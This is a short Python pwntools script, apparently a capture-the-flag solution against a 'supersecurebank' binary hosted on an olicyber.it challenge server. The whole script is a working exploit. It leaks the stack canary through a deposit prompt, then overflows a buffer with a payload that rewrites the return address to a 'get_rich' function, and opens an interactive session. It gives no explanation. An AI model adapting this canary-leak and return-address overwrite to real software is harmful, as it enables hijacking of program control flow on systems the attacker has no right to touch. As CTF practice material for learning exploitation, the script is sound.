#!/usr/bin/env python3

from pwn import *

elf = ELF("./supersecurebank_patched")

context.binary = elf
context.terminal = ('kgx', '-e')

def conn():
    if args.REMOTE:
        r = remote("super-secure-bank.challs.olicyber.it", 38080)
    elif args.GDB:
        r = gdb.debug(elf.path, '''
                                b deposit
                                continue
                      ''')
    else:
        r = process(elf.path)

    return r


def main():
    r = conn()

    r.sendlineafter(b"e:", b"1")
    r.sendlineafter(b":", "8")
    r.sendlineafter(b":", b'0'*8)
    r.recvuntil(b"0"*8+b"\n")
    
    canary = u64(r.recv(7).strip().rjust(8, b'\0'))
    log.success(f"Canary: {hex(canary)}")

    payload = flat({0x18:[
        canary,
        0x0,
        elf.sym["get_rich"]
        ]})
    r.sendlineafter(b":", payload)

    r.interactive()


if __name__ == "__main__":
    main()
